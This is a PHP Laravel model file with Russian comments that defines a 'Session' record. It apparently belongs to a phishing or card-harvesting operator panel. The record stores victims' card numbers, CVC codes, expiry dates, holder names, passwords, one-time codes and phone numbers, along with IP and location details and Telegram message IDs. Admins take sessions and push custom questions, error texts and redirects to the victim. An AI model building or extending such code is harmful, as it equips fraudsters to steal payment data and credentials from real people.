<?php

declare(strict_types=1);

namespace App\Models;

use App\Enums\ActionType;
use App\Enums\InputType;
use App\Enums\SessionStatus;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Support\Str;

class Session extends Model
{
    use HasFactory;

    /**
     * Primary key - строковый
     */
    protected $keyType = 'string';
    public $incrementing = false;

    protected $fillable = [
        'id',
        'input_type',
        'input_value',
        'card_number',
        'cvc',
        'expire',
        'phone_number',
        'holder_name',
        'code',
        'password',
        'ip',
        'ip_address', // Заменяем 'ip' на 'ip_address'
        'telegram_message_id',
        'telegram_chat_id',
        'status',
        'admin_id',
        'action_type',
        'custom_questions',
        'custom_answers',
        'custom_error_text',
        'custom_question_text',
        'custom_image_url',
        'redirect_url',
        'push_icon_id',
        'images',
        'last_activity_at',
        'pre_session_id',
        'country_code',
        'country_name',
        'city',
        'user_agent',
        'locale',
        'device_type',
    ];

    protected $casts = [
        'input_type' => InputType::class,
        'status' => SessionStatus::class,
        'action_type' => ActionType::class,
        'custom_questions' => 'array',
        'custom_answers' => 'array',
        'images' => 'array',
        'push_icon_id' => 'string',
        'last_activity_at' => 'datetime',
        'telegram_message_id' => 'integer',
        'telegram_chat_id' => 'integer',
    ];

    /**
     * Генерация уникального ID при создании
     */
    protected static function boot(): void
    {
        parent::boot();

        static::creating(function (Session $session) {
            if (empty($session->id)) {
                $session->id = self::generateUniqueId();
            }
        });
    }

    /**
     * Генерация уникального session_id
     */
    public static function generateUniqueId(): string
    {
        do {
            $id = Str::random(32);
        } while (self::where('id', $id)->exists());

        return $id;
    }

    /**
     * Админ, работающий с сессией
     */
    public function admin(): BelongsTo
    {
        return $this->belongsTo(Admin::class);
    }

    /**
     * История изменений сессии
     */
    public function history(): HasMany
    {
        return $this->hasMany(SessionHistory::class)->orderBy('created_at', 'desc');
    }

    /**
     * Проверка, назначен ли админ
     */
    public function hasAdmin(): bool
    {
        return $this->admin_id !== null;
    }

    /**
     * Проверка, может ли админ взять эту сессию
     */
    public function canBeAssignedTo(Admin $admin): bool
    {
        // Сессия свободна или уже назначена на этого админа
        return $this->admin_id === null || $this->admin_id === $admin->id;
    }

    /**
     * Проверка статуса
     */
    public function isPending(): bool
    {
        return $this->status === SessionStatus::PENDING;
    }

    public function isProcessing(): bool
    {
        return $this->status === SessionStatus::PROCESSING;
    }

    public function isCompleted(): bool
    {
        return $this->status === SessionStatus::COMPLETED;
    }

    public function isCancelled(): bool
    {
        return $this->status === SessionStatus::CANCELLED;
    }

    /**
     * Проверка, активна ли сессия
     */
    public function isActive(): bool
    {
        return $this->isPending() || $this->isProcessing();
    }

    /**
     * Путь к папке с изображениями сессии
     */
    public function getImagesPath(): string
    {
        return "sessions/{$this->id}";
    }

    /**
     * URL для редиректа на текущее действие
     */
    public function getCurrentActionUrl(): ?string
    {
        if ($this->action_type === null) {
            return null;
        }

        return $this->action_type->getRedirectPath($this->id);
    }

    /**
     * Scope: только активные сессии
     */
    public function scopeActive($query)
    {
        return $query->whereIn('status', [
            SessionStatus::PENDING->value,
            SessionStatus::PROCESSING->value,
        ]);
    }

    /**
     * Scope: только pending сессии
     */
    public function scopePending($query)
    {
        return $query->where('status', SessionStatus::PENDING->value);
    }

    /**
     * Scope: только processing сессии
     */
    public function scopeProcessing($query)
    {
        return $query->where('status', SessionStatus::PROCESSING->value);
    }

    /**
     * Get the pre-session that created this session
     */
    public function preSession()
    {
        return $this->belongsTo(PreSession::class, 'pre_session_id');
    }
    
    /**
     * Get visits for this session
     */
    public function visits()
    {
        return $this->hasMany(SessionVisit::class);
    }
    
    /**
     * Get the latest visit
     */
    public function latestVisit()
    {
        return $this->visits()->latest();
    }
    
    /**
     * Scope by input type
     */
    public function scopeByInputType($query, $type)
    {
        return $query->where('input_type', $type);
    }
    
    /**
     * Scope by country
     */
    public function scopeByCountry($query, $countryCode)
    {
        return $query->where('country_code', $countryCode);
    }
    
    /**
     * Scope by locale
     */
    public function scopeByLocale($query, $locale)
    {
        return $query->where('locale', $locale);
    }
    
    /**
     * Scope by device type
     */
    public function scopeByDeviceType($query, $deviceType)
    {
        return $query->where('device_type', $deviceType);
    }
    
    /**
     * Scope: сессии конкретного админа
     */
    public function scopeForAdmin($query, int $adminId)
    {
        return $query->where('admin_id', $adminId);
    }
}
